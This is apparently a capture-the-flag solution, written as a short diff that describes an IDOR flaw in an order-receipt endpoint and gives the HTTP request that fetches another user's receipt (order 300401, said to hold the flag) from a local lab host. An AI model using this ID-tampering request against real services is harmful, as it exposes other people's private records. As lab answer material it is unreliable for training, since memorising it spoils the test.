@@ -1,0 +1,4 @@
+# IDOR vulnerability: Any authenticated user can access receipts for arbitrary order IDs by changing the numeric ID parameter. Order 300401 contains the flag.
+
+GET /order/300401/receipt HTTP/1.1
+Host: 172.17.0.1:45815
